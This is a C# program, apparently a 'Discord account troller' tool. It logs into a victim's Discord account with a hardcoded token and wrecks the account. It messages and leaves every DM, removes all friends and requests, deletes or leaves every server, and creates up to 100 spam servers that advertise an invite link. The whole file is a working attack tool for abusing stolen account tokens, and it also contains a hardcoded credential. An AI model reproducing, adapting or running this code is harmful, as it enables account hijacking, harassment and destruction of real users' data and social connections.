using Discord;
using Discord.Gateway;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AccountRuiner
{
    class Program
    {

        static void Main()
        {
        menu:

            //I'm using Windows 8.1 now. So i cant paste anything to cmd screen (JUST C# CMD DEBUGS). I'll define string. But you have to paste it.
            //Şuanda windows 8.1 kullanmaktayım. Yani cmd'ye bireşy yapıştıramıyorum (SADECE C#'DAN DERLENMİŞ CMD EKRANLARINDA). Stringi tanımlayacağım ama siz yapıştırmak zorundasınız.


            string token = "NjYzNjk2OTI3Mzk2ODU1ODA4.XhMSXQ.1DZ8lu9t9luj_tOa11yRKZKdDQA";
            Console.Clear();
            Console.Title = "Lithe's Discord Account Troller - iLinked / Anarchy";
            Console.ForegroundColor = ConsoleColor.White;
            //Console.Write("Please Enter Token: ");
            //Console.ForegroundColor = ConsoleColor.Green;
            //string token = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnLoggedIn += Client_OnLoggedIn;
            try
            {
                client.Login(token);
                Console.Clear();
                Thread.Sleep(-1);
            }
            catch (Exception)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid Token!");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ReadLine();
                goto menu;
            }
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("How Many Guilds? (Max is 100)");
            int guilds = int.Parse(Console.ReadLine());
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Success! Press Enter When Ready");
            Console.ForegroundColor = ConsoleColor.White;
            Console.ReadLine();

            client.User.ChangeSettings(new UserSettings() { Theme = Theme.Dark });
            client.User.ChangeSettings(new UserSettings() { Language = Language.Turkish });

            foreach (var dm in client.GetPrivateChannels())
            {
                try
                {
                    dm.TriggerTyping();
                    EmbedMaker embed = new EmbedMaker
                    {
                        Title = "U are Turkish right?",
                        Description = "So there is no problem to setting your Language Turkish, right?",
                        Color = Color.FromArgb(0, 204, 255),
                        TitleUrl = "https://github.com/lithell",
                        ImageUrl = "https://cdn.discordapp.com/attachments/647463216489824276/664568953137266717/devilish.jpg",
                        ThumbnailUrl = "https://cdn.discordapp.com/attachments/647463216489824276/664568953137266717/devilish.jpg"
                    };
                    embed.Footer.Text = "Edited by Lithe";
                    embed.Footer.IconUrl = "https://cdn.discordapp.com/attachments/647463216489824276/664568953137266717/devilish.jpg";
                    dm.SendMessage("Paff Paff!", false, embed);
                }
                catch (Exception) { }
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Leaving DMs...");
                dm.Leave();

                Thread.Sleep(100);
            }

            foreach (var relationship in args.Relationships)
            {
                if (relationship.Type == RelationshipType.Friends)
                    relationship.Remove();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Removing Friends...");

                if (relationship.Type == RelationshipType.IncomingRequest)
                    relationship.Remove();
                Console.WriteLine("Removing Incoming Friend Req's");

                if (relationship.Type == RelationshipType.OutgoingRequest)
                    relationship.Remove();
                Console.WriteLine("Removing Outgoing Friend Req's");

                if (relationship.Type == RelationshipType.Blocked)
                    relationship.Remove();
                Console.WriteLine("Removing Blocked Users");
                Console.ForegroundColor = ConsoleColor.White;

            }


            foreach (var guild in client.GetGuilds())
            {
                try
                {
                    if (guild.Owner)
                        guild.Delete();

                    else
                        guild.Leave();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Left {guild}");
                    Console.ForegroundColor = ConsoleColor.White;

                    Thread.Sleep(100);

                }
                catch { }
            }

            WebClient wc = new WebClient();
            wc.DownloadFile("https://cdn.discordapp.com/attachments/647463216489824276/664568953137266717/devilish.jpg", "devilish.jpg");
            wc.Dispose();

            for (int i = 1; i <= guilds; i++)
            {
                client.CreateGuild("Devilish: https://discord.gg/5CRjRKh", Image.FromFile("devilish.jpg"), "russia");
                Console.WriteLine("Made {0} Guilds...", i);
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Done! You Can Now Close The Program.");
            Console.ForegroundColor = ConsoleColor.White;
        }
    }
}